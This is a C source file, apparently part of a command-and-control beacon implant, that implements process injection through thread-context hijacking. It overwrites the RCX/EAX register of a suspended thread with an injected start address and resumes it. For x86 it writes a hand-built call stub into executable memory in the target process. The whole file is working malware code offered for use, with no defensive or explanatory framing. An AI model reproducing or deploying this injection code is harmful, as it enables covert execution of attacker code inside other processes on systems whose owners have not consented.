#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <Tlhelp32.h>
#include "beacon.h"
#include "inject.h"

/*
* SetThreadContext / ResumeThread
*/
#if defined _M_X64
BOOL inject_via_resumethread_x64(HANDLE hThread, LPVOID lpStartAddress, LPVOID lpParameter) {
	CONTEXT ctx;

	/* try to query some information about our thread */
	ctx.ContextFlags = CONTEXT_INTEGER;
	if (!GetThreadContext(hThread, &ctx))
		return FALSE;

	/* update the Rcx value to our new start address, use Rdx to pass a parameter */
	ctx.Rcx = (DWORD64)lpStartAddress;
	ctx.Rdx = (DWORD64)lpParameter;
	if (!SetThreadContext(hThread, &ctx))
		return FALSE;

	/* kick off the thread, please */
	return ResumeThread(hThread) != -1;
}

BOOL inject_via_resumethread_x86(HANDLE hThread, LPVOID lpStartAddress, LPVOID lpParameter) {
	WOW64_CONTEXT ctx;

	/* we can't pass a parameter this way; so fail now... */
	if (lpParameter != NULL)
		return FALSE;

	/* try to query some information about our thread */
	ctx.ContextFlags = CONTEXT_INTEGER;
	if (!Wow64GetThreadContext(hThread, &ctx))
		return FALSE;

	/* update the Eax value to our new start address */
	ctx.Eax = (DWORD)lpStartAddress;
	if (!Wow64SetThreadContext(hThread, &ctx))
		return FALSE;

	/* kick off the thread, please */
	return ResumeThread(hThread) != -1;
}

BOOL inject_via_resumethread(INJECTCONTEXT * injctx, LPVOID lpStartAddress, LPVOID lpParameter) {
	if (injctx->targetArch == INJECT_ARCH_X86) {
		return inject_via_resumethread_x86(injctx->hThread, lpStartAddress, lpParameter);
	}
	else {
		return inject_via_resumethread_x64(injctx->hThread, lpStartAddress, lpParameter);
	}
}

#elif defined _M_IX86
BOOL inject_via_resumethread(INJECTCONTEXT * injctx, LPVOID lpStartAddress, LPVOID lpParameter) {
	CONTEXT ctx;
	unsigned char stub[16];
	LPVOID tramp;
	SIZE_T wrote;
	DWORD start;
	DWORD arg;

	/* probably not going to work, not going to be able to update thread context */
	if (!injctx->sameArch)
		return FALSE;

	/*
	 * x86 RtlUserThreadStart calls EAX with no way to pass lpParameter.
	 * EA/post-ex jobs always have args, so plant a remote stub:
	 *   push arg ; mov eax, start ; call eax ; ret
	 * then point EAX at the stub. Same ResumeThread path as screenshot.
	 */
	if (lpParameter != NULL) {
		start = (DWORD)(DWORD_PTR)lpStartAddress;
		arg = (DWORD)(DWORD_PTR)lpParameter;
		stub[0] = 0x68;
		memcpy(stub + 1, &arg, 4);
		stub[5] = 0xB8;
		memcpy(stub + 6, &start, 4);
		stub[10] = 0xFF;
		stub[11] = 0xD0;
		stub[12] = 0xC3;
		tramp = VirtualAllocEx(injctx->hProcess, NULL, 16, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (tramp == NULL)
			return FALSE;
		wrote = 0;
		if (!WriteProcessMemory(injctx->hProcess, tramp, stub, 13, &wrote) || wrote != 13)
			return FALSE;
		lpStartAddress = tramp;
	}

	/* try to query some information about our thread */
	ctx.ContextFlags = CONTEXT_INTEGER;
	if (!GetThreadContext(injctx->hThread, &ctx))
		return FALSE;

	/* update the Eax value to our new start address */
	ctx.Eax = (DWORD)(DWORD_PTR)lpStartAddress;
	if (!SetThreadContext(injctx->hThread, &ctx))
		return FALSE;

	/* kick off the thread, please */
	return ResumeThread(injctx->hThread) != -1;
}
#endif